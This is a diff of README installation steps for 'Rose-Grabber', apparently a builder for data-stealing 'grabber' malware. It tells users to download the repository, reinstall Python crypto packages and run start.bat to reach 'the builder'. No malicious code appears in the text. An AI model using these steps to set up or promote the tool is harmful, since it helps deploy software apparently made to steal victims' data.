@@ -109,10 +109,10 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 **By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
 + Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 + Extract the ZIP folder which you just downloaded.
-+ Because of the new install script that is not optimized and not working at all, you now need to manually Install the requirements. To do so, open a cmd in the `components/scrapedata` dir and execute this command. **``pip uninstall crypto && pip uninstall pycryptodome && pip uninstall pycrypto && pip install -r requiremens.txt``**
-- To start the program from now on then, just run the start.bat
++ Because of the new install script that is not optimized and not working at all, you now need to manually Install the requirements. To do so, open a cmd in the `components/scrapedata` dir and execute this command. **``pip uninstall crypto && pip uninstall pycryptodome && pip uninstall pycrypto && pip install -r requiremens.txt``**.
++ To start the program from now on, just double click the start script (`start.bat`) which will directly lead to the builder after successfully installing the requirements.
 
-> + Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.bat).
+> | IGNORE THIS | + Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.bat).
 
 ## Preview
 <div align="center">
